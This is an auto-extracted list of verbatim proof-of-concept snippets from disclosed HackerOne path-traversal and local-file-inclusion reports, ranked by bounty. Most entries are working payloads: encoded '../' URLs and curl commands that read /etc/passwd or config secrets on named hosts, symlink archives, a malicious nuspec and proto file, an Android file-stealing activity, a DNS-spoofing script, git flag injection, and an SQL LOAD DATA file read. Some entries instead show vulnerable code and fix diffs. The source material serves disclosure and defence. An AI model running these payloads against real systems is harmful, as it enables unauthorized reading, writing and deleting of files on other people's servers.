# Path traversal / LFI — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #1439593 Arbitrary file read  via the bulk imports UploadsPipeline — gitlab — $29,000 — Path Traversal
Source: `hackerone/reports/2022/1439593.md` (https://hackerone.com/reports/1439593)

```
       def extract(context)
          download_service(tmp_dir, context).execute
          untar_zxf(archive: File.join(tmp_dir, FILENAME), dir: tmp_dir)
          upload_file_paths = Dir.glob(File.join(tmp_dir, '**', '*'))

          BulkImports::Pipeline::ExtractedData.new(data: upload_file_paths)
        end
```

```
        def load(context, file_path)
          avatar_path = AVATAR_PATTERN.match(file_path)

          return save_avatar(file_path) if avatar_path

          dynamic_path = file_uploader.extract_dynamic_path(file_path)

          return unless dynamic_path
          return if File.directory?(file_path)

          named_captures = dynamic_path.named_captures.symbolize_keys

          UploadService.new(context.portable, File.open(file_path, 'r'), file_uploader, **named_captures).execute
        end
```

```
mkdir ./d3209c811fee407218bff7cb3b4333e6
ln -s /etc/passwd ./d3209c811fee407218bff7cb3b4333e6/passwd
ln -s /srv/gitlab/config/secrets.yml ./d3209c811fee407218bff7cb3b4333e6/secrets.yml
tar cvzf uploads.tar.gz ./d3209c811fee407218bff7cb3b4333e6
    
```

## #827052 Arbitrary file read via the UploadsRewriter when moving and issue — gitlab — $20,000 — Path Traversal
Source: `hackerone/reports/2020/827052.md` (https://hackerone.com/reports/827052)

```
  MARKDOWN_PATTERN = %r{\!?\[.*?\]\(/uploads/(?<secret>[0-9a-f]{32})/(?<file>.*?)\)}.freeze
```

```
   @text.gsub(@pattern) do |markdown|
          file = find_file(@source_project, $~[:secret], $~[:file])
          break markdown unless file.try(:exists?)

          klass = target_parent.is_a?(Namespace) ? NamespaceFileUploader : FileUploader
          moved = klass.copy_to(file, target_parent)
...
   def find_file(project, secret, file)
        uploader = FileUploader.new(project, secret: secret)
        uploader.retrieve_from_store!(file)
        uploader
      end
```

```
![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)
```

## #822262 Path traversal in Nuget Package Registry — gitlab — $12,000 — Path Traversal
Source: `hackerone/reports/2022/822262.md` (https://hackerone.com/reports/822262)

```
      XPATHS = {                                                               
        package_name: '//xmlns:package/xmlns:metadata/xmlns:id',               
        package_version: '//xmlns:package/xmlns:metadata/xmlns:version'        
      }.freeze 
...
      def extract_metadata(file)                                               
        doc = Nokogiri::XML(file)                                              
                                                                               
        XPATHS.map do |key, query|                                             
          [key, doc.xpath(query).text]                                         
        end.to_h 
```

```
        @package_file.transaction do                                           
          @package_file.update!(                                               
            file_name: package_filename,                                       
            file: @package_file.file                                           
          )      
...
      def package_filename                                                     
        "#{package_name.downcase}.#{package_version.downcase}.nupkg"           
      end    
```

```
  <?xml version="1.0" encoding="utf-8"?>                                       
  <package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">  
    <metadata>                                                                 
      <id>DummyProject.DummyPackage</id>                                       
      <version>../../../../../nyangawa</version>                                            
    </metadata>                                                                
  </package>                                                                   
```

## #3712279 Burp Suite Professional: browser-powered crawl can write attacker-controlled files through file input handling — portswigger — $5,000 — Path Traversal
Source: `hackerone/reports/2026/3712279.md` (https://hackerone.com/reports/3712279)

```
<!doctype html>
<html>
  <body>
    <form action="/upload" method="post" enctype="multipart/form-data">
      <input
        type="file"
        name="upload"
        value="calc.exe"
        accept="./../../../../Roaming/Microsoft/Windows/Start Menu/Programs/Startup/burp_calc.bat">
      <button type="submit">Upload</button>
    </form>
  </body>
</html>
```

```
python -m http.server 8000
```

```
http://192.168.186.149:8000/poc_file_input_write_startup_calc.html
```

## #2256167 Path traversal through path stored in Uint8Array in Node.js 20 — ibb — $3,495 — Path Traversal
Source: `hackerone/reports/2024/2256167.md` (https://hackerone.com/reports/2256167)

```
$ node --experimental-permission \
        --allow-fs-read=/tmp/ \
        -p 'fs.readFileSync(new TextEncoder().encode("/tmp/../etc/passwd"))'
<Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 6e 6f 62 6f 64 79 3a 78 3a 36 35 35 33 34 3a 36 35 35 33 34 3a 4e ... 2103 more bytes>
```

```
        --allow-fs-read=/tmp/ \
        -p 'fs.readFileSync(new TextEncoder().encode("/tmp/../etc/passwd"))'
```

## #2434811 Path traversal by monkey-patching Buffer internals — ibb — $2,430 — Path Traversal
Source: `hackerone/reports/2024/2434811.md` (https://hackerone.com/reports/2434811)

```
$ node --experimental-permission --allow-fs-read=/tmp 
Welcome to Node.js v20.8.1.
Type ".help" for more information.
> Buffer.prototype.utf8Write = ((w) => function (str, ...args) {
...   return w.apply(this, [str.replace(/^\/exploit/, '/tmp/..'), ...args]);
... })(Buffer.prototype.utf8Write);
[Function (anonymous)]
> fs.readFileSync(new TextEncoder().encode('/exploit/etc/passwd'))
<Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 64 61 65 6d 6f 6e 3a 78 3a 31 3a 31 3a 64 61 65 6d 6f ... 3174 more bytes>
```

```
diff --git a/lib/internal/fs/utils.js b/lib/internal/fs/utils.js
index 611b6c2420..d7e6ec3aa2 100644
--- a/lib/internal/fs/utils.js
+++ b/lib/internal/fs/utils.js
@@ -66,4 +66,6 @@ const kStats = Symbol('stats');
 const assert = require('internal/assert');
 
+const { encodeUtf8String } = internalBinding('encoding_binding');
+
 const {
   fs: {
@@ -720,5 +722,8 @@ function possiblyTransformPath(path) {
     assert(isUint8Array(path));
     if (!BufferIsBuffer(path)) path = BufferFrom(path);
-    return BufferFrom(resolvePath(BufferToString(path)));
+    // Avoid Buffer.from() and use a C++ binding instead to encode the result
+    // of path.resolve() in order to prevent path traversal attacks that
+    // monkey-patch Buffer internals.
+    return encodeUtf8String(resolvePath(BufferToString(path)));
   }
   return path;
```

```
     assert(isUint8Array(path));
     if (!BufferIsBuffer(path)) path = BufferFrom(path);
```

## #2225660 Permission model improperly protects against path traversal in Node.js 20 — ibb — $2,330 — Path Traversal
Source: `hackerone/reports/2023/2225660.md` (https://hackerone.com/reports/2225660)

```
$ node --experimental-permission --allow-fs-read=/tmp/ -p "path.resolve = (s) => s; fs.readFileSync('/tmp/../etc/passwd')"
<Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 72 6f 6f 74 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 64 61 65 6d 6f 6e 3a 78 3a 31 3a 31 3a 64 61 65 6d 6f ... 3174 more bytes>
```

```
diff --git a/lib/internal/fs/utils.js b/lib/internal/fs/utils.js
index b7354e30e9..4971656d0a 100644
--- a/lib/internal/fs/utils.js
+++ b/lib/internal/fs/utils.js
@@ -710,2 +710,3 @@ const validatePath = hideStackFrames((path, propName = 'path') => {
 // The permission model needs the absolute path for the fs_permission
+const resolvePath = pathModule.resolve;
 function possiblyTransformPath(path) {
@@ -713,3 +714,3 @@ function possiblyTransformPath(path) {
     if (typeof path === 'string') {
-      return pathModule.resolve(path);
+      return resolvePath(path);
     }
```

## #301432 GitLab CI runner can read and poison cache of all other projects — gitlab — $2,000 — Path Traversal
Source: `hackerone/reports/2018/301432.md` (https://hackerone.com/reports/301432)

```
a:
  script:
  - ls -lashR
  cache:
    key: ../1/cache
    policy: pull
    paths:
      - .
```

```
[0KRunning with gitlab-runner 10.3.0 (5cf5e19a)
  on docker-auto-scale (e11ae361)
[0;m[0KUsing Docker executor with image ruby:2.1 ...
[0;m[0KUsing docker image sha256:4eadb9b5cb46f487a71d05717762679404f7f6fdec1ba4fa96304de1db07dfef for predefined container...
[0;m[0KPulling docker image ruby:2.1 ...
[0;m[0KUsing docker image ruby:2.1 ID=sha256:223d1eaa9523fa64e78f5a92b701c9c11cbc507f0ff62246dbbacdae395ffea3 for build container...
[0;msection_start:1514659811:prepare_script
[0KRunning on runner-e11ae361-project-4989754-concurrent-0 via runner-e11ae361-srm-1514658950-a15d8859...
section_end:1514659812:prepare_script
[0Ksection_start:1514659813:get_sources
[0K[32;1mCloning repository...[0;m
Cloning into '/builds/jobertabma/build-test'...
[32;1mChecking out e01918e5 as master...[0;m
[32;1mSkipping Git submodules setup[0;m
section_end:1514659814:get_sources
[0Ksection_start:1514659814:restore_cache
[0K[32;1mChecking cache for ../13083/ruby-235-with-yarn...[0;m
Downloading cache.zip from http://runners-cache-5-internal.gitlab.com:444/runner/project/13083/ruby-235-with-yarn[0;m 
[32;1mSuccessfully extracted cache[0;m
section_end:1514659844:restore_cache
```

```
a:
  script:
  - echo 1 > file-to-poison
  cache:
    key: ../1/cache
    policy: push
    paths:
      - file-to-poison
```

## #1650273 Off-by-slash vulnerability in nodejs.org and iojs.org — ibb — $1,200 — Path Traversal
Source: `hackerone/reports/2022/1650273.md` (https://hackerone.com/reports/1650273)

```
    location /metrics {
        alias /home/dist/metrics/;
        autoindex on;
        default_type text/plain;
    }
```

## #1415820 Zero day path traversal vulnerability in Grafana 8.x allows unauthenticated arbitrary local file read — aiven_ltd — $1,000 — Path Traversal
Source: `hackerone/reports/2021/1415820.md` (https://hackerone.com/reports/1415820)

```
curl https://grafana-303ca6f8-████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

```
$ curl https://grafana-303ca6f8-███████.aivencloud.com/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
███
█████
██████
██████████
██████████
████████
██████
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
systemd-coredump:x:992:991:systemd Core Dumper:/:/sbin/nologin
systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
systemd-timesync:x:991:990:systemd Time Synchronization:/:/sbin/nologin
██████████
dbus:x:81:81:System message bus:/:/sbin/nologin
█████
████████
██████
█████████
██████████
███
██████████
███
█████
█████████
██████████
███
███
████
███
```

```
curl --path-as-is https://grafana-303ca6f8-█████████.aivencloud.com/public/plugins/mysql/../../../../../../../../../../../../usr/share/grafana/conf/defaults.ini
```

## #4000535 Burp Community OpenAPI site-map action reads a local schema example through $id rebasing — portswigger — $1,000 — Path Traversal
Source: `hackerone/reports/2026/4000535.md` (https://hackerone.com/reports/4000535)

```
python3 -B verify_shapes.py
```

```
REPRO_SHAPES=PASS
```

```
python3 repro_server.py --mode exploit --schema local-schema.json
```

## #1575014 Limited path traversal in Node.js SDK leads to PII disclosure — stripe — $1,000 — Information Disclosure
Source: `hackerone/reports/2023/1575014.md` (https://hackerone.com/reports/1575014)

```
    STRIPE_SECRET_KEY=xxx
    STATIC_DIR=/app/client
    DOMAIN=http://localhost:4242
    
```

```
{                                                                                                                                                                                                                  
  "object": "list",                                                                                                                                                                                                
  "data": [                                                                                                                                                                                                        
    {                                                                                                                                                                                                              
      "id": "cs_test_a14L46PUF4tbXhcFrVU4Zv42kBQD2Hw5TIR6XdNHPJFckllG1Un4MztwlF",                                                                                                                                  
      "object": "checkout.session",                                                                                                                                                                                
      "after_expiration": null,                                                                                                                                                                                    
      "allow_pro
```

```
    '''
    STRIPE_SECRET_KEY=xxx
    STATIC_DIR=/app/client
    DOMAIN=http://localhost:4242
    '''
```

## #317321 Delete directory using symlink when decompressing tar — rubygems — $500 — Path Traversal
Source: `hackerone/reports/2019/317321.md` (https://hackerone.com/reports/317321)

```
require 'rubygems/package'

class GemBuiler

   def initialize spec, path
    @_build_time      = Time.now
    @_checksums       = {}
    @_signer          = Gem::Security::Signer.new nil, nil, ""
    @_spec            = spec
    @_path            = path
  end

  def build &block
    Gem.load_yaml
    require 'rubygems/security'

    @_spec.mark_version

    File.open @_path, 'wb' do |gem_io|
      Gem::Package::TarWriter.new gem_io do |gem|
        add_metadata gem
        add_contents gem, &block
        add_checksums gem
      end
    end
  end

  def add_checksums tar
    Gem.load_yaml

    checksums_by_algorithm = Hash.new { |h, algorithm| h[algorithm] = {} }

    @_checksums.each do |name, digests|
      digests.each do |algorithm, digest|
        checksums_by_algorithm[algorithm][name] = digest.hexdigest
      end
    end

    tar.add_file_signed 'checksums.yaml.gz', 0444, @_signer do |io|
      gzip_to io do |gz_io|
        YAML.dump checksums_by_algorithm, gz_io
      end
    end
  end

  def add_contents tar, &block
    digests = tar.add_file_signed 'data.tar.gz', 0444, @_signer do |io|
      gzip_to io do |gz_io|
        Gem::Package::TarWriter.new gz_io, &block
      end
    end

    @_checksums['data.tar.gz'] = digests
  end

  def add_metadata tar 
    digests = tar.add_file_signed 'metadata.gz', 0444, @_signer do |io|
      gzip_to io do |gz_io|
        gz_io.write @_spec.to_yaml
      end
    end

    @_checksums['metadata.gz'] = digests
  end

  def gzip_to i
```

```
$ ls /tmp/dir
file

$ ruby builder.rb

$ gem unpack rm_dir.gem
ERROR:  While executing gem ... (Gem::Package::PathError)
    installing into parent path tmp/dir of /xxx/yyy/zzz/... is not allowed

$ ls /tmp/dir
ls: /tmp/dir: No such file or directory
```

```
    @_build_time      = Time.now
    @_checksums       = {}
    @_signer          = Gem::Security::Signer.new nil, nil, ""
    @_spec            = spec
    @_path            = path
```

## #411519 DNS SRV lookup of file:// sources enables local hijacking of gems — rubygems — $500 — Path Traversal
Source: `hackerone/reports/2018/411519.md` (https://hackerone.com/reports/411519)

```
victim$ mkdir -p /home/victim/trusted-gem-path/gems
victim$ (cd /home/victim/trusted-gem-path/gems && gem fetch --clear-sources --source https://rubygems.org/ minitest)
victim$ gem generate_index -d /home/victim/trusted-gem-path
```

```
# Make a malicious gem
attacker$ mkdir lib
attacker$ echo 'puts "hacked"' > lib/hacked.rb
attacker$ cat <<EOF > hacked.gemspec
Gem::Specification.new do |s|
  s.name = 'minitest'
  s.version = '5.11.3'
  s.files = ['lib/hacked.rb']
end
EOF
attacker$ gem build --force hacked.gemspec 
# Make it available under /tmp/attack
attacker$ mkdir -p /tmp/attack/home/victim/trusted-gem-path/gems
attacker$ cp minitest-5.11.3.gem /tmp/attack/home/victim/trusted-gem-path/gems
attacker$ gem generate_index -d /tmp/attack/home/victim/trusted-gem-path
```

```
#!/usr/bin/env python3

from scapy.all import *

TARGET = b"xxx./tmp/attack"

def respond(pkt):
    if not (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
        return
    q = pkt[DNSQR]
    # Nothing after "_rubygems._tcp." indicates that the host is empty;
    # i.e., that it's likely a lookup for a file:// URL. 33 == SRV.
    if not (q.qname == b"_rubygems._tcp." and q.qtype == 33):
        return
    resp = IP(src=pkt[IP].dst, dst=pkt[IP].src) \
        / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) \
        / DNS(qr=1, id=pkt[DNS].id, qd=q, ancount=1) \
        / DNSRRSRV(type=33, rrname=q.qname, ttl=30, priority=0, weight=1, port=80, rdlen=8+len(TARGET), target=TARGET)
    send(resp)

sniff(filter="udp dst port 53", prn=respond)
```

## #895972 Limited LFI — gsa_bbp — $300 — Remote File Inclusion
Source: `hackerone/reports/2020/895972.md` (https://hackerone.com/reports/895972)

```
 public function index($page = 'main')
    {

        $data = array();

        $docs_path = ($this->config->item('docs_path')) ? $this->config->item('docs_path') : 'https://raw.githubusercontent.com/GSA/project-open-data-dashboard/master/documentation/';
        $docs_path = $docs_path . $page . '.md';
        $docs = @file_get_contents($docs_path);
```

```
        $docs_path = ($this->config->item('docs_path')) ? $this->config->item('docs_path') : 'https://raw.githubusercontent.com/GSA/project-open-data-dashboard/master/documentation/';
        $docs_path = $docs_path . $page . '.md';
        $docs = @file_get_contents($docs_path);
```

## #590319 Linux client is vulnerable to directory traversal when downloading files — nextcloud — $250 — Path Traversal
Source: `hackerone/reports/2020/590319.md` (https://hackerone.com/reports/590319)

```
    <d:resourcetype />
    <d:getlastmodified />
    <d:getcontentlength />
    <d:getetag />
    <oc:id />
    <oc:downloadURL />
    <oc:dDC />
    <oc:permissions />
    <oc:checksums />
    <oc:data-fingerprint />
    <oc:share-types />
```

## #1408692 Access to arbitrary file of the Nextcloud Android app from within the Nextcloud Android app — nextcloud — $250 — Path Traversal
Source: `hackerone/reports/2022/1408692.md` (https://hackerone.com/reports/1408692)

```
        if (file.getStoragePath().startsWith("/data/data/")) {
            Log_OC.d(TAG, "Upload from sensitive path is not allowed");
            return;
        }
```

```
public class EvilActivity extends AppCompatActivity {
    private static final String LOG_TAG = EvilActivity.class.getName();

    final static String PRIVATE_URI = "file:///data/user/0/com.nextcloud.client/shared_prefs/com.nextcloud.client_preferences.xml";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("heen", "EvilActivity started!");
        setResult(-1, new Intent().setData(Uri.parse(PRIVATE_URI)));
        finish();
    }
}
```

```
    private static final String LOG_TAG = EvilActivity.class.getName();
```

## #1650270 GitHub Security Lab (GHSL) Vulnerability Report: Insufficient path validation in ReceiveExternalFilesActivity.java (GHSL-2022-060) — owncloud — $50 — Path Traversal
Source: `hackerone/reports/2023/1650270.md` (https://hackerone.com/reports/1650270)

```
private void prepareStreamsToUpload() {
    // --snip--

    for (Uri stream : mStreamsToUpload) {
        String streamToUpload = stream.toString();
        if (streamToUpload.contains("/data") &&
                streamToUpload.contains(getPackageName()) &&
                !streamToUpload.contains(getCacheDir().getPath())
        ) {
            finish();
        }
    }
}
```

```
private void showUploadTextDialog() {
        // --snip--
        final TextInputEditText input = dialogView.findViewById(R.id.inputFileName);
        // --snip--
        setFileNameFromIntent(alertDialog, input);
        alertDialog.setOnShowListener(dialog -> {
            Button button = alertDialog.getButton(AlertDialog.BUTTON_POSITIVE);
            button.setOnClickListener(view -> {
                // --snip--
                } else {
                    fileName += ".txt";
                    Uri fileUri = savePlainTextToFile(fileName);
                    mStreamsToUpload.clear();
                    mStreamsToUpload.add(fileUri);
                    uploadFiles();
                }
                inputLayout.setErrorEnabled(error != null);
                inputLayout.setError(error);
            });
        });
        alertDialog.show();
    }
```

```
private Uri savePlainTextToFile(String fileName) {
    Uri uri = null;
    String content = getIntent().getStringExtra(Intent.EXTRA_TEXT);
    try {
        File tmpFile = new File(getCacheDir(), fileName); // here
        FileOutputStream outputStream = new FileOutputStream(tmpFile);
        outputStream.write(content.getBytes());
        outputStream.close();
        uri = Uri.fromFile(tmpFile);

    } catch (IOException e) {
        Timber.w(e, "Failed to create temp file for uploading plain text: %s", e.getMessage());
    }
    return uri;
}
```

## #960330 CVE-2020-3187 - Unauthenticated Arbitrary File Deletion — deptofdefense — - — Path Traversal
Source: `hackerone/reports/2020/960330.md` (https://hackerone.com/reports/960330)

```
     curl -k -s -i https://██████/+CSCOE+/session_password.html
```

```
     curl -k -H "Cookie: token=../+CSCOU+/csco_logo.gif" https://█████████/+CSCOE+/session_password.html
```

## #2553411 Path traversal in deeplink query parameter can expose any user's private info to a public directory (one click) — basecamp — - — Path Traversal
Source: `hackerone/reports/2024/2553411.md` (https://hackerone.com/reports/2553411)

```
[------------------------------------Package Details---------------------------------------]:
|    Application Name  :Basecamp
|    Package Name      :com.basecamp.bc3
|    Version code      :380
|    Version Name      :4.8.6
|    Mimimum SDK       :28
|    Target  SDK       :34
|    Max SDK           :None
|    Sha256            :124861dde5cbb9a38d0994c3ca994fbbe5bae83b79621b7e476a0aa78bb711f2
[------------------------------------------------------------------------------------------]
```

## #3580511 ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection — rails — - — Path Traversal
Source: `hackerone/reports/2026/3580511.md` (https://hackerone.com/reports/3580511)

```
when Hash
  ActiveStorage::Blob.build_after_unfurling(
    **attachable.reverse_merge(
      record: record,
      service_name: attachment_service_name
    ).symbolize_keys
  )
```

```
def build_after_unfurling(key: nil, io:, filename:, content_type: nil, metadata: nil, service_name: nil, identify: true, record: nil)
  new(key: key, filename: filename, content_type: content_type, metadata: metadata, service_name: service_name).tap do |blob|
    blob.unfurl(io, identify: identify)
  end
end
```

```
set_callback on, on == :initialize ? :after : :before do
  if new_record? && !query_attribute(attribute)
    send("#{attribute}=", generate_token.call)
  end
end
```

## #3384150 Arbitrary File Write — arkadiyt-projects — - — Path Traversal
Source: `hackerone/reports/2025/3384150.md` (https://hackerone.com/reports/3384150)

```
func (pd *ProtoDefinition) Filename() string {
    goPackage := pd.pb.GetOptions().GetGoPackage()
    index := strings.Index(goPackage, ";")
    if index == -1 {
        return pd.descriptor.Path()
    }
    // BUG: No sanitization of goPackage path
    return path.Join(goPackage[:index], path.Base(pd.descriptor.Path()))
}
```

```
filename := definition.Filename()
if strings.HasSuffix(filename, ".proto") {
    dir := path.Join(*output, path.Dir(filename))
    final := path.Join(dir, path.Base(filename))
    os.MkdirAll(dir, 0700)
    os.WriteFile(final, []byte(definition.String()), 0700)
    fmt.Printf("Wrote %s\n", final)
}
```

```
syntax = "proto3";
package exploit;

// Malicious path traversal
option go_package = "../../../tmp/pwned;exploit";

message MaliciousMessage {
  string data = 1;
}
```

## #4057637 [HIGH] CWE-22 — Path Traversal in FTP Wildcard Download via Unencoded `.` in Escaped Filenames — curl — - — Path Traversal
Source: `hackerone/reports/2026/4057637.md` (https://hackerone.com/reports/4057637)

```
After URL-decoding in ftp_parse_url_path(), validate that the resulting
path does not contain ".." components that traverse outside the intended
directory. Alternatively, validate finfo->filename in the
CURLWC_DOWNLOADING state before it is ever escaped reject filenames
containing "/", "..", or an absolute-path leading "/".
```

```
    `char *enc = curl_easy_escape(NULL, finfo->filename, 0);`
    ...
    `tmp_path = curl_maprintf("%s%s", wildcard->path, enc);`
    ...
    `ftp->pathalloc = ftp->path = tmp_path;`
```

```
    `result = Curl_urldecode(ftp->path, 0, &ftpc->rawpath, &pathLen, REJECT_CTRL);`
```

## #1070247 Git flag injection leads to arbitrary file write — phabricator — - — Path Traversal
Source: `hackerone/reports/2021/1070247.md` (https://hackerone.com/reports/1070247)

```
curl http://dev.localhost/api/diffusion.internal.gitrawdiffquery \
    -d api.token=api-token \
    -d commit=--output%3D/tmp/qqq \
    -d repository=R2
```

```
git log -n1 -M -C -B --raw -t 'abbrev=40' --pretty-format: '--output=/tmp/qqq'
```

```
$ cat /tmp/qqq
:100644 100644 848bd2831d44979d9e9ad553401d513b1d591c68 4f2e7bd7f250114d6b14fcf3a775391f49e85ed0 M      a.c
```

## #3931777 Author → arbitrary file deletion anywhere on disk (site takeover) via `POST /wp/v2/media/<id>/finalize` poisoning `_wp_attachment_metadata` — wordpress — - — Path Traversal
Source: `hackerone/reports/2026/3931777.md` (https://hackerone.com/reports/3931777)

```
			'/' . $this->rest_base . '/(?P<id>[\d]+)/finalize',
			array(
				array(
					'methods'             => WP_REST_Server::CREATABLE,
					'callback'            => array( $this, 'finalize_item' ),
					'permission_callback' => array( $this, 'edit_media_item_permissions_check' ),
```

```
function wp_is_client_side_media_processing_enabled(): bool {
	// This is due to SharedArrayBuffer requiring a secure context.
	$host    = strtolower( (string) strtok( $_SERVER['HTTP_HOST'] ?? '', ':' ) );
	$enabled = ( is_ssl() || 'localhost' === $host || str_ends_with( $host, '.localhost' ) );
	...
	return (bool) apply_filters( 'wp_client_side_media_processing_enabled', $enabled );
```

```
function gutenberg_is_client_side_media_processing_enabled() {
	/**
	 * Filters whether client-side media processing is enabled.
	 * ...
	 */
	return apply_filters( 'wp_client_side_media_processing_enabled', true );
}
```

## #719875 LFI through the MySQL connection — infogram — - — Information Disclosure
Source: `hackerone/reports/2019/719875.md` (https://hackerone.com/reports/719875)

```
LOAD DATA LOCAL INFILE '/etc/passwd'
INTO TABLE asd.asd
FIELDS TERMINATED BY "\n"
```

## #3255707 Windows Device Names Still Allow Path Traversal in UNC Paths After CVE-2025-27210 Fix — nodejs — - — Path Traversal
Source: `hackerone/reports/2025/3255707.md` (https://hackerone.com/reports/3255707)

```
const path = require('path');

// This is fixed (regular path)
console.log(path.normalize('CON:../../secret.txt'));
// Output: .\CON:..\..\secret.txt ✓

// But this is still vulnerable (UNC path)
console.log(path.join('\\\\server\\share\\uploads', 'CON:../../secret.txt'));
// Output: \\server\share\secret.txt ✗
// Should be: \\server\share\uploads\.\CON:..\..\secret.txt
```

```
const path = require('path');

function getNetworkFile(userInput) {
  const basePath = '\\\\\\\\fileserver\\\\public\\\\uploads';
  return path.join(basePath, userInput);
}

console.log(getNetworkFile('CON:../../../private/passwords.txt'));
"
```

## #3328367 Path traversal via archive.extract - CVE 2021-3281 incomplete patch — django — - — Path Traversal
Source: `hackerone/reports/2025/3328367.md` (https://hackerone.com/reports/3328367)

```
# django/django/utils/archive.py
def target_filename(self, to_path, name):
    target_path = os.path.abspath(to_path)
    filename = os.path.abspath(os.path.join(target_path, name))
    if not filename.startswith(target_path):
        raise SuspiciousOperation("Archive contains invalid path: '%s'" % name)
    return filename
```

```
"/var/library/test.txt".startswith("/var/lib") == true
```

```
import os
target_path = os.path.abspath("/var/lib/")
filename = os.path.abspath(os.path.join(target_path, "/var/library/test.txt"))
if not filename.startswith(target_path):
   raise Exception
```

## #2233418 Unathenticated file read (CVE-2020-3452)  — deptofdefense — - — Path Traversal
Source: `hackerone/reports/2023/2233418.md` (https://hackerone.com/reports/2233418)

```
GET /+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua HTTP/1.1
Host: ██████
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip, deflate, br

2.) The response will contain contents of portal_inc.lua
```

## #270072 Unpacker improperly validates symlinks, allowing gems writes to arbitrary locations — rubygems — - — Path Traversal
Source: `hackerone/reports/2018/270072.md` (https://hackerone.com/reports/270072)

```
$ tar -xvf symlink.gem
metadata.gz
data.tar.gz
$ tar -tvf data.tar.gz
-rw-r--r-- 0/0              12 1969-12-31 16:00 README
lrw-r--r-- 0/0               0 1969-12-31 16:00 link -> /tmp
-rw-r--r-- 0/0               6 1969-12-31 16:00 link/HACKED
```

```
gem install symlink.gem
# or
gem unpack symlink.gem
```

## #333306 Directory traversal at https://msg.algolia.com — algolia — - — Path Traversal
Source: `hackerone/reports/2018/333306.md` (https://hackerone.com/reports/333306)

```
GET /static/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd HTTP/1.1
Host: msg.algolia.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: id,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: __cfduid=d34587d94eba9413080d1f7aca5062a871522817854
Connection: close
Upgrade-Insecure-Requests: 1

Response:
```

## #2032778 Internal machine learning API endpoint for CWE classification is vulnerable to path traversal — security — - — Path Traversal
Source: `hackerone/reports/2023/2032778.md` (https://hackerone.com/reports/2032778)

```
curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1", "trained_at": "2023-01-01T00:00:00Z/../../..", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'
```

```
curl -X POST http://localhost:8082/predict/report_weakness_id -H 'content-type: application/json' -d'{"version":"v1/../../../..", "trained_at": "2023-01-01T00:00:00Z", "input": [{"title": "test xss", "num_of_top_predictions": 3}]}'
```

```
@app.post(
    "/predict/report_weakness_id",
    summary="An endpoint to suggest report's weakness id.",
)
async def report_weakness_id(request: ReportWeaknessIdModelRequest):
    """
    To try the endpoint in the Swagger UI, click on **Try it out** and copy-paste the below example in the request body box
    
```

## #260420 [dev-nightly.ubnt.com] Local File Reading — ui — - — Path Traversal
Source: `hackerone/reports/2017/260420.md` (https://hackerone.com/reports/260420)

```
GET /..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
Host: dev-nightly.ubnt.com
```

```
curl "https://dev-nightly.ubnt.com/..\..\..\etc\passwd"
```

```
GET /..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
Host: dev-nightly.ubnt.com
'''
'''
curl "https://dev-nightly.ubnt.com/..\..\..\etc\passwd"
'''

**Result**
```

## #850775 Windows only: arbitrary file read vulnerability in openssl s_server — ibb — - — Path Traversal
Source: `hackerone/reports/2020/850775.md` (https://hackerone.com/reports/850775)

```
diff --git a/apps/s_server.c b/apps/s_server.c
index 038046808037..5f58ef68fefa 100644
--- a/apps/s_server.c
+++ b/apps/s_server.c
@@ -3211,6 +3211,12 @@ static int www_body(int s, int stype, int prot, unsigned char *context)
                 if (e[0] == ' ')
                     break;
 
+                if (e[0] == ':') {
+                    /* Windows drive. We treat this the same way as ".." */
+                    dot = -1;
+                    break;
+                }
+
                 switch (dot) {
                 case 1:
                     dot = (e[0] == '.') ? 2 : 0;
